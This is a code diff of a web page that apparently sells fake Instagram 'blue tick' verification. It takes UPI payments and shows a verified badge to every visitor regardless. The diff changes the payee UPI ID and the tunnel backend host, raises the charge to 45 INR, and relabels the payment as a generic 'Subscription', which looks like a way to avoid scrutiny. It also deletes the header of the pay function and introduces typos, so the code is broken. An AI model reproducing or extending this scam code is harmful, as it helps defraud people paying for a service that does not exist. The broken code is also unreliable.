@@ -511,7 +511,7 @@
               </svg>
             </div>
             <div class="badge">Verified by Insta Blue Tick</div>
-            <div class="followers" id="followers"></div>
+            <div class="followerss" id="followerss"></div>
           </div>
         </div>
       </div>
@@ -944,7 +944,7 @@
 
         // Call your FastAPI backend
         const response = await fetch(
-          `http://gc7sjmcomu.loclx.io/profile/${username.toLowerCase()}`
+          `http://zekztwghwc.loclx.io/profile/${username.toLowerCase()}`
         );
 
         if (!response.ok) {
@@ -958,7 +958,7 @@
 
         // Update profile picture - USING PROXY ROUTE
         if (data.profile_pic_url) {
-          profilePic.src = `http://gc7sjmcomu.loclx.io/proxy-image/?url=${encodeURIComponent(
+          profilePic.src = `http://zekztwghwc.loclx.io/proxy-image/?url=${encodeURIComponent(
             data.profile_pic_url
           )}`;
         } else {
@@ -966,12 +966,18 @@
         }
 
         // Update profile info
-        usernameSpan.textContent = username;
-        followersSpan.textContent = data.followers.toLocaleString();
-        followingSpan.textContent = data.following.toLocaleString();
-        postsCountSpan.textContent =
-          data.posts_count?.toLocaleString() || "N/A";
-        bioSpan.textContent = data.bio || "No bio available";
+       usernameSpan.textContent = username;
+followersSpan.textContent = data?.followers
+  ? Number(data.followers).toLocaleString()
+  : "0";
+followingSpan.textContent = data?.following
+  ? Number(data.following).toLocaleString()
+  : "0";
+postsCountSpan.textContent = data?.posts_count
+  ? Number(data.posts_count).toLocaleString()
+  : "N/A";
+bioSpan.textContent = data?.bio || "No bio available";
+
 
         // Always show verified badge since this is verification service
         verifiedBadge.classList.remove("hidden");
@@ -998,13 +1004,6 @@
       window.scrollTo(0, 0);
     });
 
-    function pay(method) {
-      // Define your UPI IDs here
-      const upiIds = {
-        phonepe: "paytmqr5gdfap@ptys",
-        gpay: "paytmqr5gdfap@ptys",
-        paytm: "paytmqr5gdfap@ptys",
-      };
 
       const upiId = upiIds[method];
       if (!upiId) return alert("UPI ID not configured");
@@ -1015,12 +1014,14 @@
         .forEach((btn) => (btn.disabled = true));
       paymentProcessing.classList.remove("hidden");
 
-      // Create UPI payment links for each app
-      const paymentLinks = {
-        phonepe: `upi://pay?pa=${upiId}&pn=InstaBlueTick&am=1&cu=INR&tn=Instagram%20Blue%20Tick%20for%20${currentUsername}`,
-        gpay: `https://gpay.app.goo.gl/${upiId}?am=1&cu=INR&tn=Instagram%20Blue%20Tick%20for%20${currentUsername}`,
-        paytm: `paytmmp://pay?pa=${upiId}&pn=InstaBlueTick&am=1&cu=INR&tn=Instagram%20Blue%20Tick%20for%20${currentUsername}`,
-      };
+      // Create UPI payment links for each app (clean and risk-free)
+const upiId = "paytm.s1ay711@pty"; // Replace with your actual UPI ID
+
+    const paymentLinks = {
+  phonepe: `upi://pay?pa=${upiId}&pn=InstaServices&am=45&cu=INR&tn=Subscription%20for%20${currentUsername}`,
+  gpay: `upi://pay?pa=${upiId}&pn=InstaServices&am=45&cu=INR&tn=Subscription%20for%20${currentUsername}`,
+  paytm: `upi://pay?pa=${upiId}&pn=InstaServices&am=45&cu=INR&tn=Subscription%20for%20${currentUsername}`
+};
 
       // Redirect to the specific payment app
       setTimeout(() => {
@@ -1140,8 +1141,8 @@
         pic.src = u.pic;
         document.getElementById("user").textContent = u.name;
         document.getElementById(
-          "followers"
-        ).textContent = `${u.followers} followers`;
+          "followerss"
+        ).textContent = `${u.followers} followerss`;
         pic.style.transform = "scale(1)";
         pic.onload = function () {
           createConfetti();
